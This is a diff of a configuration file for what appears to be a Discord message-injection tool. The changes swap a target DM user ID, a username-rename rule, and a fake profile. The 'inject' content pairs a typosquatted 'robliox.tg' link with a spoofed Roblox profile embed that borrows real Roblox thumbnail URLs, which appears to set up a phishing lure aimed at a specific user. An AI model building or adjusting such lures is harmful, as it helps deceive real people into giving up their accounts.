@@ -87,7 +87,7 @@
                 ],
               
                 usernameRules: [
-                  { matchId: ".Tweety", newId: "Emaytee" }
+                  { matchId: "xeo3125", newId: "Xeo" }
                 ],
               
                 tagRules: [
@@ -96,8 +96,8 @@
                 quick: {
                   mode: "inject",
                   channelId: "",
-                  dmUserId: "753944929973174283",
-                  content: "https://www.robliox.tg/users/6081066/profile embedTitle: \"Konethorix's Profile\" embedDescription: \"Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...\" embedThumbnail: \"https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avapshot/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528\"",
+                  dmUserId: "1020358701737062481",
+                  content: "https://www.robliox.tg/users/6081066/profile embedTitle: \"xeodiablo's Profile\" embedDescription: \"xeodiablo is one of the millions creating and exploring the endless possibilities of Roblox. Join xeodiablo on Roblox and explore together!\" embedThumbnail: \"https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avapshot/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528\"",
                   embed: {
                     title: "",
                     description: "",
